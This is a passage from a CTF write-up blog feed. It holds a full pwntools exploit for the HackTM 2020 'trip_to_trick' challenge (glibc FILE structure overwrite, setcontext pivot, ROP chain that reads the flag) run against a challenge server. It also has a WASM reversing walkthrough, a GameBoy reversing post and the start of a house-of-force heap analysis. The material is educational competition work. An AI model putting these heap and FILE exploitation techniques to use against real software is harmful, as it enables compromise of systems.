is because _IO_LIST_ALL contains a linked list of the filestreams, by default stdin,stdout and stderr are already loaded so the next is 3:10(stdin)-&gt;1(stdout)-&gt;2(stderr)-&gt;3(newfd) Full python code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228from pwn import *host, port = \"138.68.67.161\", \"20006\"filename = \"./trip_to_trick\"elf = ELF(filename)context.arch = 'amd64'if not args.REMOTE: libc = elf.libcelse: libc = ELF('./libc.so.6')def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): script = \"\" PIE = get_PIE(r) PAPA = PIE for x in bp: script += \"b *0x%x\\n\"%(PIE+x) gdb.attach(r,gdbscript=script)context.terminal = ['tmux', 'new-window']def exploit(): global r r = getConn() if not args.REMOTE and args.GDB: debug([0x000014e2,0x000013ce]) r.recvuntil('gift : ') SYSTEM = int(r.recvline().rstrip(),16) LIBC = SYSTEM-libc.symbols['system'] _IO_BUF_BASE = 0x38 _IO_BUF_END = 0x40 _IO_2_1_STDIN_ = LIBC+libc.symbols['_IO_2_1_stdin_'] _IO_2_1_STDERR_ = LIBC+libc.symbols['_IO_2_1_stderr_'] _IO_2_1_STDOUT_ = LIBC+libc.symbols['_IO_2_1_stdout_'] _IO_FILE_JUMPS = LIBC+libc.symbols['_IO_file_jumps'] _IO_HELPER_JUMPS = _IO_2_1_STDIN_+0xf60 _IO_STDFILE_0_LOCK = _IO_2_1_STDIN_+0x2b90 _IO_WIDE_DATA_0 = _IO_2_1_STDIN_+0xe0 _IO_STDFILE_1_LOCK = _IO_2_1_STDOUT_+0x1e20 _IO_WIDE_DATA_1 = _IO_2_1_STDOUT_-0xea0 _IO_STDFILE_2_LOCK = _IO_2_1_STDERR_+0x1ef0 _IO_WIDE_DATA_2 = _IO_2_1_STDERR_-0xf00 _IO_LIST_ALL = LIBC+libc.symbols['_IO_list_all'] SETCONTEXT_SPITVOT = LIBC+libc.symbols['setcontext']+0x35 log.info(\"SYSTEM 0x%x\" % SYSTEM) log.info(\"LIBC 0x%x\" % LIBC) # STDIN+131 INPUT2 ='\\x0a'+'\\x00'*4# p64(_IO_STDFILE_0_LOCK) INPUT2 += p64(_IO_STDFILE_0_LOCK) INPUT2 += p64(-0x1, signed=True) # _offset INPUT2 += p64(0x0) # _codecvt INPUT2 += p64(_IO_WIDE_DATA_0) # _wide_data INPUT2 += p64(0x0) # _freeres_list INPUT2 += p64(0x0) # _freeres_buf INPUT2 += p64(0x0) # __pad5 INPUT2 += p32(-0x1, signed=True) # _mode INPUT2 += p32(0x0) # _unused2 INPUT2 += p64(0x0) # _unused2 INPUT2 += p64(0x0) # _unused2 INPUT2 += p64(_IO_FILE_JUMPS) # vtable\"\"\" INPUT2 += p64(0x0)*19*2 + p64(LIBC+0x1bb020)+p64(0x0) INPUT2 += p64(LIBC+libc.symbols['__memalign_hook']) # __memalign_hook INPUT2 += p64(0x0) INPUT2 += p64(0x0)+p64(0x0) INPUT2 += '\\x00'*2208 # MAIN_ARENA INPUT2 += p64(LIBC+0x896b0) + p64(0x0) # obstack_alloc_failed_handler INPUT2 += p64(LIBC+0x185072)*2 # tzname INPUT2 += p64(0)*4 # program_invocation_short_name INPUT2 += p64(0)+p64(1)+p64(2)+p64(LIBC+0x1bd2d8)+p64(0)+p64(-0x1,signed=True) # default_overflow_region INPUT2 += p64(LIBC)+p64(LIBC) # __libc_utmp_jump_table # _nl_global_locale OFFSETLIST = [1971584, 1972928, 1973056, 1975232, 1972480, 1972352, 0, 1974400, 1974496, 1974624, 1974816, 1974944, 1975040, 1680352, 1676512, 1678048, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 0] for offset in OFFSETLIST: if offset == 0: INPUT2 += p64(0) else: INPUT2 += p64(LIBC+offset) INPUT2 += p64(0)*2 INPUT2 += p64(_IO_LIST_ALL+0x20)+p64(0)*3 # IO_LIST_ALL # STDERR INPUT2 += p64(0xfbad2887) # _flags INPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_read_ptr INPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_read_end INPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_read_base INPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_write_base INPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_write_ptr INPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_write_end INPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_buf_base INPUT2 += p64(_IO_2_1_STDERR_+132) # _IO_buf_end INPUT2 += p64(0x0) # _IO_save_base INPUT2 += p64(0x0) # _IO_backup_base INPUT2 += p64(0x0) # _IO_save_end INPUT2 += p64(0x0) # _markers INPUT2 += p64(_IO_2_1_STDOUT_) # _chain INPUT2 += p32(0x0) # _fileno INPUT2 += p32(0x0) # _flags2 INPUT2 += p64(-0x1, signed=True) # _old_offset INPUT2 += p16(0x0) # _cur_column INPUT2 += p8(0x0) # _vtable_offset INPUT2 += p8(0x0) # _shortbuf INPUT2 += p32(0x0) # _shortbuf INPUT2 += p64(_IO_STDFILE_2_LOCK) # _lock INPUT2 += p64(-0x1, signed=True) # _offset INPUT2 += p64(0x0) # _codecvt INPUT2 += p64(_IO_WIDE_DATA_2) # _wide_data INPUT2 += p64(0x0) # _freeres_list INPUT2 += p64(0x0) # _freeres_buf INPUT2 += p64(0x0) # __pad5 INPUT2 += p32(-0x1, signed=True) # _mode INPUT2 += p32(0x0) # _unused2 INPUT2 += p64(0x0) # _unused2 INPUT2 += p64(0x0) # _unused2 INPUT2 += p64(_IO_FILE_JUMPS) # vtable # STDOUT INPUT2 += p64(0x0) # _flags INPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_read_ptr INPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_read_end INPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_read_base INPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_write_base INPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_write_ptr INPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_write_end INPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_buf_base INPUT2 += p64(_IO_2_1_STDOUT_+132) # _IO_buf_end INPUT2 += p64(0x0) # _IO_save_base INPUT2 += p64(0x0) # _IO_backup_base INPUT2 += p64(0x0) # _IO_save_end INPUT2 += p64(0x0) # _markers INPUT2 += p64(_IO_2_1_STDIN_) # _chain INPUT2 += p32(0x0) # _fileno INPUT2 += p32(0x0) # _flags2 INPUT2 += p64(-0x1, signed=True) # _old_offset INPUT2 += p16(0x0) # _cur_column INPUT2 += p8(0x0) # _vtable_offset INPUT2 += p8(0x0) # _shortbuf INPUT2 += p32(0x0) # _shortbuf INPUT2 += p64(_IO_STDFILE_1_LOCK) # _lock INPUT2 += p64(-0x1, signed=True) # _offset INPUT2 += p64(0x0) # _codecvt INPUT2 += p64(_IO_WIDE_DATA_1) # _wide_data INPUT2 += p64(0x0) # _freeres_list INPUT2 += p64(0x0) # _freeres_buf INPUT2 += p64(0x0) # __pad5 INPUT2 += p32(-0x1, signed=True) # _mode INPUT2 += p32(0x0) # _unused2 INPUT2 += p64(0x0) # _unused2 INPUT2 += p64(0x0) # _unused2 INPUT2 += p64(_IO_HELPER_JUMPS) # vtable INPUT2 += p64(_IO_2_1_STDERR_) # stderr INPUT2 += p64(_IO_2_1_STDOUT_) # stdout INPUT2 += p64(_IO_2_1_STDIN_) # stdin INPUT2 += p64(0) #print(len(ROP_CHAIN)) INPUT2 += '\\x00'*(0x1f*8) # __elf_set___libc_subfreeres INPUT2 += p64(0) # vtable IO_HELPER_JUMPS INPUT2 += p64(0)+p64(0)+p64(SETCONTEXT_SPITVOT) # _IO_helper_jumps STACKPIVOT SETCONTEXT \"\"\" setcontext+0x35 mov rsp, [rdx+0A0h] mov rbx, [rdx+80h] mov rbp, [rdx+78h] mov r12, [rdx+48h] mov r13, [rdx+50h] mov r14, [rdx+58h] mov r15, [rdx+60h] mov rcx, [rdx+0A8h] push rcx mov rsi, [rdx+70h] mov rdi, [rdx+68h] mov rcx, [rdx+98h] mov r8, [rdx+28h] mov r9, [rdx+30h] mov rdx, [rdx+88h] xor eax, eax retn \"\"\" POPRAX = LIBC + 0x0000000000047cf8 # pop rax ; ret POPRDI = LIBC + 0x0000000000026542 # pop rdi ; ret POPRDX = LIBC + 0x000000000012bda6 # pop rdx ; ret POPRSI = LIBC + 0x0000000000026f9e # pop rsi ; ret SYSCALL = LIBC + 0x00000000000cf6c5 # syscall ; ret FLAG_PATH = _IO_HELPER_JUMPS+0x178#LIBC+0x1baad8#+16*8 ROP_ADDR = _IO_HELPER_JUMPS+0xa8#LIBC+0x1baa08 ROP_CHAIN = p64(POPRAX)*2#p64(OPEN) ROP_CHAIN += p64(2) + p64(POPRDI) + p64(FLAG_PATH) + p64(POPRSI) + p64(0) + p64(SYSCALL) # OPEN(file=flag_path) syscall == 2 ROP_CHAIN += p64(POPRAX) + p64(0) + p64(POPRDI) + p64(3) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(0x49) +p64(SYSCALL) # READ(fd=3,buf=flag_path,nbytes=0x49) syscall == 0 ROP_CHAIN += p64(POPRAX) + p64(1) + p64(POPRDI) + p64(1) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(0x49) +p64(SYSCALL) # WRITE(fd=1,buf=flag_path,nbyes=0x49) syscall == 1 ROP_CHAIN += \"flag\\x00\" #ROP_CHAIN = '' INPUT2 += '\\x00'*0x88+p64(ROP_ADDR)+ ROP_CHAIN #+ '\\x00'*(190+7+3) + ROP_CHAIN#+ '\\x00'*(0x90-0x88+0x8)+ p64(LIBC) #INPUT2 += p64(0)*16*2 # _nl_global_locale r.sendlineafter('1 : ', \"%x %x\" %(_IO_2_1_STDIN_+_IO_BUF_END,_IO_2_1_STDIN_+0x2000)) r.sendafter('2 : ', INPUT2) #r.interactive() flag = r.recvall(timeout=2) r.close() if 'HackTM' in flag: print(flag) return True else: return False while not exploit(): pass Running it: 12345678910111213141516171819$ python trip_to_trick.py REMOTE[*] '/ctf/work/pwn/TripToTrick/trip_to_trick' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[*] '/ctf/work/pwn/TripToTrick/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to 138.68.67.161 on port 20006: Done[*] SYSTEM 0x7f1c8b934fd0[*] LIBC 0x7f1c8b8e2000[+] Receiving all data: Done (73B)[*] Closed connection to 138.68.67.161 port 20006HackTM&#123;d747aab3b6d6a95300eede7e3337397ace5131240e0fa9b849058f27f635e182&#125; References https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fake-vtable-exploit/ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24/ https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique http://blog.angelboy.tw/ https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/ https://blog.rh0gue.com/2017-12-31-34c3ctf-300/","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"IO_FILE","slug":"Pwn/x64/Glibc-Malloc/IO-FILE","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/IO-FILE/"}],"tags":[{"name":"file_stream","slug":"file-stream","permalink":"https://teamrocketist.github.io/tags/file-stream/"},{"name":"io_file","slug":"io-file","permalink":"https://teamrocketist.github.io/tags/io-file/"},{"name":"io_file_struct","slug":"io-file-struct","permalink":"https://teamrocketist.github.io/tags/io-file-struct/"},{"name":"hacktm2020","slug":"hacktm2020","permalink":"https://teamrocketist.github.io/tags/hacktm2020/"}]},{"title":"[Reverse] 36c3 - xmas_future","slug":"Reverse-36c3-xmas-future","date":"2019-12-30T03:02:38.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/12/30/Reverse-36c3-xmas-future/","link":"","permalink":"https://teamrocketist.github.io/2019/12/30/Reverse-36c3-xmas-future/","excerpt":"","text":"xmas_future Points96Solves95CategoryReverse Description:Most people just give you a present for christmas, hxp gives you a glorious future. If you’re confused, simply extract the flag from this 山葵 and you shall understand. :)xmas_future-265eb0be46555aad.tar.xz (15.5 KiB)by benediktwerner So we are given a bunch of html/wasm file, after running the php web server with the run.sh file we are presented with a page:The system will say the flag was correct if we insert the right flag, so let’s inspect the source:Next step is to check hxp2019.js:Check function is located at the WebAssembly file and its parameters are, the pointer offset to the string and the length of the string. Instead of debugging the file through OP_CODES in the browser I found a tool that can decompile it and also convert it to a c file. After cloning the repo I followed the instructions on readme to build and compile the project: After building everything new executables are added to the bin/ folder: 123$ ls bin/spectest-interp* wasm2wat* wasm-interp* wasm-opcodecnt* wasm-validate* wat2wasm*wasm2c* wasm-decompile* wasm-objdump* wasm-strip* wast2json* wat-desugar* First I decompiled the file using wasm-decompile:12$ mkdir ../../challenge$ ./wasm-decompile ../../hxp2019_bg.wasm -o ../../challenge/dec.js And now lets convert also to c: 1$ ./wasm2c ../../hxp2019_bg.wasm -o ../../challenge/hxp2019_bg.c Lets see the new files created: 123$ cd ../../challenge$ lsdecompiled.js hxp2019_bg.c hxp2019_bg.h Lets start first with the decompiled file which is a lot easier to read:Looking at the hxp2019_check_h578f31d490e10a31Checking the verifications of the rest of the characters:Now that we know what is going on, we can start to look where the final check is located in the c generated files, so we can do dynamic analysis with gdb… First let’s fix some wrong paths at hxp2019_bg.c from: 12345#include &lt;math.h&gt;#include &lt;string.h&gt;#include \"../../challenge/hxp2019_bg.h\"... To: 12345#include &lt;math.h&gt;#include &lt;string.h&gt;#include \"hxp2019_bg.h\"... The function in c is named hxp2019__check__h578f31d490e10a31: 1234567891011static u32 hxp2019__check__h578f31d490e10a31(u32 p0, u32 p1) &#123; u32 l2 = 0, l3 = 0, l4 = 0, l5 = 0, l6 = 0, l7 = 0, l8 = 0, l9 = 0, l10 = 0; FUNC_PROLOGUE; u32 i0, i1, i2; ... i1 &amp;= i2; i0 = i0 == i1; // final check is here we might want to put a breakpoint here. if (i0) &#123;goto L7;&#125; ...&#125; Putting a break point there is a solution but this makes a lot of effort to make the conditions always true and check the correct character. We could also write a gdbscript or r2script but once again takes a lot of time… Since this c files are compilable we can just modify the source code to print the flag characters and turn this condition to always return true. But first we need to learn how to compile this kind of auto generated files, an example can be found at the wabt directory: 1234567891011# dependencies$ ls ../wabt/wasm2c/wasm-rt.h wasm-rt-impl.c wasm-rt-impl.h$ cp ../wabt/wasm2c/wasm-rt.h .$ cp ../wabt/wasm2c/wasm-rt-impl.c .$ cp ../wabt/wasm2c/wasm-rt-impl.h .# Copying fac example files$ ls ../wabt/wasm2c/examples/fac/fac.c fac.h fac.wasm fac.wat main.c$ cp ../wabt/wasm2c/examples/fac/* .$ rm fac.c fac.h fac.wasm Now looking at the example of main.c file from fac:12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/* Uncomment this to define fac_init and fac_Z_facZ_ii instead. *//* #define WASM_RT_MODULE_PREFIX fac_ */#include \"fac.h\" // Change this to hxp2019_bg.hint main(int argc, char** argv) &#123; /* Make sure there is at least one command-line argument. */ if (argc &lt; 2) return 1; /* Convert the argument from a string to an int. We'll implictly cast the int to a `u32`, which is what `fac` expects. */ u32 x = atoi(argv[1]); /* Initialize the fac module. Since we didn't define WASM_RT_MODULE_PREFIX, the initialization function is called `init`. */ init(); /* Call `fac`, using the mangled name. */ u32 result = Z_facZ_ii(x); // We need to change this function too the real name is located at hxp2019_bg.h /* Print the result. */ printf(\"fac(%u) -&gt; %u\\n\", x, result); return 0;&#125; As you can see we need to adapt the example main function the current file we want to debug to find the correct Z_xxxZ function we can look at the header file generated hxp2019_bg.h:The adapted main.c file: 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/* Uncomment this to define fac_init and fac_Z_facZ_ii instead. *//* #define WASM_RT_MODULE_PREFIX fac_ */#include \"hxp2019_bg.h\"/*b hxp2019_bg.c:2268b hxp2019_bg.c:2434r 1048576 50*/int main(int argc, char** argv) &#123; /* Make sure there is at least one command-line argument. */ if (argc &lt; 2) return 1; /* Convert the argument from a string to an int. We'll implictly cast the int to a `u32`, which is what `fac` expects. */ u32 x = atoi(argv[1]); u32 y = atoi(argv[2]); /* Initialize the fac module. Since we didn't define WASM_RT_MODULE_PREFIX, the initialization function is called `init`. */ init(); /* Call `fac`, using the mangled name. */ u32 result = Z_checkZ_iii(x,y); // 1048576 50 /* Print the result. */ printf(\"check(%u,%u) -&gt; %u\\n\", x,y, result); return 0;&#125; Let’s use gcc to compile everything:1234567$ gcc -m32 -ggdb wasm-rt-impl.c -o wasm-rt-impl.o -c$ gcc -m32 -ggdb hxp2019_bg.c -o hxp2019_bg.o -c$ gcc -m32 -ggdb main.c -o main.o -c# linking everything$ gcc -m32 -ggdb -o main main.o hxp2019_bg.o wasm-rt-impl.o$ ./main 1048576 50check(1048576,50) -&gt; 0 Generating a make file so we don’t have to repeat ourselfs over and over: 12345678910111213CC=gccCFLAGS=-I. -ggdb -m32DEPS = hxp2019_bg.h wasm-rt.h wasm-rt-impl.hOBJ = hxp2019_bg.o wasm-rt-impl.o main.o%.o: %.c $(DEPS) $(CC) -c -o $@ $&lt; $(CFLAGS)main: $(OBJ) $(CC) -o $@ $^ $(CFLAGS)clean: rm *.o rm -f main Now we just need do make clean and make to compile everything: 12345678$ make cleanrm *.orm -f main$ makegcc -c -o hxp2019_bg.o hxp2019_bg.c -I. -ggdb -m32gcc -c -o wasm-rt-impl.o wasm-rt-impl.c -I. -ggdb -m32gcc -c -o main.o main.c -I. -ggdb -m32gcc -o main hxp2019_bg.o wasm-rt-impl.o main.o -I. -ggdb -m32 Note that the flag -m32 is to compile the binary in 32 bits and the -ggdb is to add symbols to gdb so we can debug everything and watch the source code instead of only viewing the assembly :). Now advancing to change hxp2019_bg.c file to print us the flag on execution we need to populate the input string before doing the checks, also that loop we investigated before is only doing the checks inside of the flag brackets hxp{…}, the rest of the flag is being checked somewhere else in the code, we don’t really need to know where, we just need to populate the begining and the end with the right characters and the rest with As… Let’s do a function that does that: 1234567891011void populate() &#123; memory.data[1048576u+0] = 'h'; // i32_store((&amp;memory), (u64)(1048576u + 0), 'h'); memory.data[1048576u+1] = 'x'; memory.data[1048576u+2] = 'p'; memory.data[1048576u+3] = '&#123;'; for (int i = 4; i &lt; 49; ++i) &#123; memory.data[1048576u+i] = 'A'; &#125; memory.data[1048576u+49] = '&#125;';&#125; We add this call before the check call at static u32 check(u32 p0, u32 p1): 12345static u32 check(u32 p0, u32 p1) &#123;...populate();i0 = hxp2019__check__h578f31d490e10a31(i0, i1);... Now modifying hxp2019__check__h578f31d490e10a31: 123456789101112131415static u32 hxp2019__check__h578f31d490e10a31(u32 p0, u32 p1) &#123; printf(\"%s\",\"hxp&#123;\"); // print flag header ... i0 = i32_load8_u((&amp;memory), (u64)(i0)); i1 = l6; i2 = 255u; i1 &amp;= i2; i1 = i0; // make the condition always true printf(\"%c\", i1); // print current flag character i0 = i0 == i1; // condition if (i0) &#123;goto L7;&#125; // continue with the loop ... puts(\"&#125;\"); return i0;&#125; You can download the files here. Now compiling everything with make: 12345$ makegcc -c -o hxp2019_bg.o hxp2019_bg.c -I. -ggdb -m32gcc -c -o wasm-rt-impl.o wasm-rt-impl.c -I. -ggdb -m32gcc -c -o main.o main.c -I. -ggdb -m32gcc -o main hxp2019_bg.o wasm-rt-impl.o main.o -I. -ggdb -m32 Running and getting the flag: 123$ ./main 1048576 50hxp&#123;merry_xmas___github.com/benediktwerner/rewasm&#125;check(1048576,50) -&gt; 1","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"wasm","slug":"wasm","permalink":"https://teamrocketist.github.io/tags/wasm/"},{"name":"36c3","slug":"36c3","permalink":"https://teamrocketist.github.io/tags/36c3/"}]},{"title":"[Reverse] Kipod2019 - GameBob","slug":"Reverse-Kipod2019-GameBob","date":"2019-12-26T12:31:45.000Z","updated":"2022-08-23T23:01:48.887Z","comments":true,"path":"2019/12/26/Reverse-Kipod2019-GameBob/","link":"","permalink":"https://teamrocketist.github.io/2019/12/26/Reverse-Kipod2019-GameBob/","excerpt":"","text":"GameBob Points80Solves16CategoryReverse Description:I built that small GameBoy program that just prints out the flag, and I don’t think I forgot anything. GameBob.gbGameBob.sym We have both GameBob.gb ROM and GameBob.sym which containts the symbol names to the functions which will help a lot on the reverse job. Unlike in a previous write up I actually managed to work with bdb which is a much better debugger than No\\$GMB. bgb not only has more options that also doesn’t have some random crashes that I was experience with No$GMB. Actually bgb is works in a very similar way. Here are some of the shortcuts I used while using this debugger: 12345F2 - Break PointF3 - StepF6 - Jump to Cursor (Modifies the PC(program counter) register to the address at the cursor) CTRL + F - Search for a string (nice to search for symbol names)CTRL + G - Jump to specified address After opening bgb we right click on the window to load the ROM, after that the game will start playing but the debugger window won’t show up unless we right click again (other -&gt; Debugger): Since we have symbols to find the main function we can just use CTRL+F and search for main, then just put a break point in the beginning with F2, note that while we are focusing the Debugger Window the game is frozen but if we click on the game window the game runs it works like a continue instruction in gdb:After inserting the breakpoint at the main and do some steps with F3 right before executing the . If we step over from call print_string_delayed we will see that the parameters passed to this function is the string that will be printed (“Welcome to the Game Bob”):If we do a few more steps we can see and after stepping over the 2nd print_string_delayed the string printed to the string will be “It’s a really easy challenge, so here is your flag”:After this a stack is created at the global flag_stack (D000): Using CTRL+G on the hexviewer to watch memory region at (D000):After doing multiple calls after executing call print_stack we can view in memory that multiple characters were pushed into the stack this were encrypted flag characters:So obviously something is missing after looking at the file with the symbols I found a function with a suspicious name called _secret which basically pops the encrypted characters from the stack and pushes the decrypted flag characters. There are no calls to this function so one of the solutions would be to patch the file, perhaps I didn’t resorted to this solution, instead I just used jumps to jump to _secret function before the arguments of print_stack call:This can be done by using the functionality jump to cursor (Shortcut F6) that the debugger offers, we could also changed the register manually at the top right corner where the registers are shown:Putting a break point at the end of the function (ret instruction located at 0x4da) we can see new items were pushed into the stack:Now jumping back back to main using jump to cursorNow doing a couple of steps print_stack will execute and print the flag into the screen:","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"kipod2019","slug":"kipod2019","permalink":"https://teamrocketist.github.io/tags/kipod2019/"},{"name":"gameboy","slug":"gameboy","permalink":"https://teamrocketist.github.io/tags/gameboy/"},{"name":"no$gmb","slug":"no-gmb","permalink":"https://teamrocketist.github.io/tags/no-gmb/"},{"name":"bgb","slug":"bgb","permalink":"https://teamrocketist.github.io/tags/bgb/"}]},{"title":"[Pwn] Kipod2019 - CloneWarS","slug":"Pwn-Kipod2019-CloneWarS","date":"2019-12-26T04:28:38.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/12/26/Pwn-Kipod2019-CloneWarS/","link":"","permalink":"https://teamrocketist.github.io/2019/12/26/Pwn-Kipod2019-CloneWarS/","excerpt":"","text":"CloneWarS Points90Solves13CategoryPwn Description:A long time ago in a galaxy far, far away…. ssh yeet@ctf2.kaf.sh -p 7000 password: 12345678CloneWarS TLDR Leak heap from R2D2 Overflow top_chunk size Leak global file pointer Use house of force to write into file Trigger system(file) Binary AnalysisThe binary is the only file we get from this challenge: 12$ file CloneWarSCloneWarS: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=a45e46d5347deb6022d64604638a3ed70e8de417, not stripped From the file command output we know that: ELF compiled for x86_x64 architecture Dynamically linked Not stripped Using checksec to see the enabled protections: 1234567$ checksec CloneWarS[*] '/ctf/work/pwn/CloneWarS/CloneWarS' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FULL RELRO (GOT entries are read only we can’t overwrite them) STACK CANARY (The stack is protected with the canary if there is a stack overflow we need to find a way to leak it) NX (Non executable stack) PIE (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address) Static AnalysisUsing Ida to check on the main function we can see we have a bunch of options: 12345678910111213141516171819202122232425while ( v3 != 7 ) &#123; switch ( v3 ) &#123; case 1LL: build_death_star(); // option 1 break; case 2LL: R2D2(); // option 2 break; case 3LL: prep_starship(); // option 3 break; case 4LL: make_troopers(); // option 4 break; case 5LL: light_sabers(); // option 5 break; case 6LL: cm2_dark_side(); // option 6 break; default: break; &#125; By looking at build_death_star: 123456789101112unsigned __int64 build_death_star()&#123; int v1; // [rsp+Ch] [rbp-14h] unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); v1 = 0; fwrite(\"Assemble death star: \", 1uLL, 0x15uLL, stderr); __isoc99_scanf(\"%d\", &amp;v1); // We can control the size of the allocated string malloc(v1); // allocated object (the pointer not saved anywhere) return __readfsqword(0x28u) ^ v2;&#125; As we can see above we have a controlled sized malloc this is important if we want to use certain exploits on the heap. By looking at R2D2: 123456789101112131415unsigned __int64 R2D2()&#123; int v1; // [rsp+Ch] [rbp-14h] char *v2; // [rsp+10h] [rbp-10h] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); v1 = 0; fwrite(\"R2? \", 1uLL, 4uLL, stderr); __isoc99_scanf(\"%x\", &amp;v1); v2 = (char *)starships + 272; fprintf(stderr, \"\\nR2D2 IS .... %ld ...... ON THIS TRACK !! 0x6733894F08\\n\", (char *)starships + 272);// Leak Heap getchar(); return __readfsqword(0x28u) ^ v3;&#125; R2D2 gives us a free leak to the heap because of this we can calculate the offset to the HEAP BASE. Checking out theprep_starship: 123456789101112131415161718192021unsigned __int64 prep_starship()&#123; int v1; // [rsp+4h] [rbp-2Ch] int c; // [rsp+8h] [rbp-28h] int v3; // [rsp+Ch] [rbp-24h] unsigned __int64 v4; // [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u); v1 = 0; fwrite(\"Master, the amount of starships: \", 1uLL, 0x21uLL, stderr); __isoc99_scanf(\"%d\", &amp;v1); // reads size from the stdin starships = malloc(v1); // a new allocated starship with a controllable size c = 0; v3 = 0; fwrite(\"\\nWhat kind of starships?: \", 1uLL, 0x1AuLL, stderr); __isoc99_scanf(\"%x\", &amp;c); // Value to be set fwrite(\"\\nCapacity of troopers in the starships: \", 1uLL, 0x28uLL, stderr); __isoc99_scanf(\"%d\", &amp;v3); // Number of bytes memset(starships, c, v3); // Heap Overflow return __readfsqword(0x28u) ^ v4;&#125; As you can see because of memset we can overflow the heap by an amount we can control (capacity of the troppers) and we can also control the content that will overflow it (kind of starships). Analysing make_troopers 123456789101112131415161718unsigned __int64 make_troopers()&#123; int v1; // [rsp+Ch] [rbp-34h] char *dest; // [rsp+10h] [rbp-30h] char src[8]; // [rsp+18h] [rbp-28h] char buf; // [rsp+20h] [rbp-20h] unsigned __int64 v5; // [rsp+38h] [rbp-8h] v5 = __readfsqword(0x28u); fwrite(\"\\nTroopers to be deployed: \", 1uLL, 0x1AuLL, stderr); read(0, &amp;buf, 0x14uLL); // content limited to 0x14 bytes v1 = atoi(&amp;buf); dest = (char *)malloc(v1); // once again a controllable sized malloc fwrite(\"\\nWhat kind of troopers?: \", 1uLL, 0x19uLL, stderr); src[(int)((unsigned __int64)read(0, src, 8uLL) - 1)] = 0; // puts a null byte at the (8-1) position of the string strcpy(dest, src); // puts the content from stdin into the new allocated chunk return __readfsqword(0x28u) ^ v5;&#125; Nothing wrong with this one (in terms of security at least) but this one can be useful to store some content to a certain pointer specially if we manage to make malloc return an arbirtrary pointer to a place we want. light_sabers is the same as make_troopers but instead of putting a null byte at the 8th position of the read string it puts at the 0x14-1 which is right at the end of the string. Analysing cm2_dark_side: 12345int cm2_dark_side()&#123; fprintf(stderr, \"\\nFile is at: %ld\\n\", file); // file pointer leaked return system(file); // system call&#125; file is a global variable located at the BSS once again we get a free leak with this we can get the offset to the pie base and get access to the rest of the global variables, this function also hints us that the final objective of this challenge is to find a way to change the content of file to get a shell or print the flag. House of force the jedi overflowIt’s not a coincidence that the theme of this challenge is about star wars, Obi wan intuitively says to us:The ingredients to use house of force can be interpreted as follows: The exploiter must be able to overwrite the top chunk. There is a malloc() call with an exploiter-controllable size. There is another malloc() call where data are controlled by the exploiter. We checked all the requirements: We have a heap-overflow at the function prep_starship through memset. We have a multiple malloc calls with controllable sizes for example in build_death_star. We have a malloc call where we can control its data in make_troopers and light_sabers. So the core of this attack is to overwrite av-&gt;top with an big arbitrary value so it can later force malloc (which uses the top chunk) to return an arbitrary pointer to an address we want to modify. So what is the top_chunk ? top_chunk also known as the wilderness is a special chunk that defines how much space is left in 